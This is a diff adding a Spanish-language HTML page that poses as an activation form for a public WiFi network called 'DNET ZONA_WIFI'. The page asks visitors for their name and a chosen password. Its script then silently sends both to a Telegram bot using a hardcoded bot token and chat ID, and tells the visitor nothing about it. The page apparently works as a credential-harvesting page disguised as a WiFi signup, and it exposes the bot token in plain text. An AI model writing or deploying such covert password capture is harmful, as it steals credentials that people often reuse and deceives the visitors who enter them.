@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DNET | Activación Zona WiFi</title>
+  <style>
+    body {
+      background: #a6e4e7;
+      font-family: 'Segoe UI', sans-serif;
+      color: #222;
+      text-align: center;
+      padding: 40px 20px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px auto;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      max-width: 400px;
+      font-size: 16px;
+      display: block;
+      box-sizing: border-box;
+    }
+    input {
+      background: #fff;
+      color: #000;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #03a9f4;
+      color: white;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #ccc;
+      cursor: default;
+    }
+    #imagenCanvas {
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    p {
+      font-size: 16px;
+      max-width: 420px;
+      margin: 10px auto;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <h2>📶</h2>
+  <h2>DNET ZONA_WIFI</h2> 
+  <h2>ACTIVACION DE CUENTA</h2>
+
+  <p>Ingresá el <strong>Nombre del Cliente</strong> y creá una <strong>Contraseña personalizada</strong> que es la que va a usar para conectarse a nuestra red WiFi pública</p>. <strong>DNET ZONA_WIFI</strong>.</p>
+
+  <input type="text" id="cliente" placeholder="Tu nombre">
+  <input type="password" id="contraseña" placeholder="Contraseña deseada">
+  <button id="btnActivar"
+    onclick="activarCuenta()"
+    ontouchstart="activarCuenta()"
+  >
+    Activar Zona WiFi
+  </button>
+
+  <div id="opciones" style="display:none;">
+    <canvas id="imagenCanvas" width="320" height="300"></canvas>
+    <button onclick="copiarTexto()">📋 Copiar Información</button>
+    <button onclick="descargarImagen()">📥 Descargar Imagen</button>
+  </div>
+
+  <script>
+    let scriptMikrotik = "";
+    let datosGenerados = "";
+
+    function activarCuenta() {
+      const cliente = document.getElementById("cliente").value.trim();
+      const pass = document.getElementById("contraseña").value.trim();
+      if (!cliente || !pass) return alert("⚠️ Completá ambos campos.");
+
+      // Desactivar botón
+      const boton = document.getElementById("btnActivar");
+      boton.disabled = true;
+      boton.style.opacity = "0.5";
+      boton.innerText = "✔️ Zona WiFi Activada";
+
+      // Generar Script Mikrotik
+      scriptMikrotik = `/ip hotspot user add name="admin" profile="Permanente" server="hotspot1" disabled=no password="${pass}" comment="${cliente}"`;
+
+      // Enviar al bot Telegram
+      const token = "7052268290:AAF0Bd3EkW-0n5AMeI_ot1HbcwlPjYNBqmo";
+      const chat_id = "5878686199";
+      const mensaje = `✔️ Nueva cuenta creada:\n${scriptMikrotik}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: mensaje })
+      });
+
+      // Información generada
+      datosGenerados = `                 ✅ DNET ZONA_WIFI\n\nUsuario: admin\nContraseña: ${pass}\n\nCÓMO CONECTARSE:\n1. Abrí configuración WiFi.\n2. Seleccioná la red: DNET ZONA_WIFI.\n3. Ingresá los datos provistos.`;
+
+      // Mostrar opciones
+      document.getElementById("opciones").style.display = "block";
+
+      // Crear imagen
+      const canvas = document.getElementById("imagenCanvas");
+      const ctx = canvas.getContext("2d");
+      ctx.fillStyle = "#FCF5DE";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.font = "16px Segoe UI";
+      ctx.fillStyle = "#212121";
+      datosGenerados.split("\n").forEach((line, i) => {
+        ctx.fillText(line, 10, 30 + i * 24);
+      });
+    }
+
+    function copiarTexto() {
+      navigator.clipboard.writeText(datosGenerados).then(() => {
+        alert("✅ Datos copiados al portapapeles.");
+      });
+    }
+
+    function descargarImagen() {
+      const canvas = document.getElementById("imagenCanvas");
+      const link = document.createElement("a");
+      link.download = "cuenta_dnet.png";
+      link.href = canvas.toDataURL();
+      link.click();
+    }
+  </script>
+</body>
+</html>
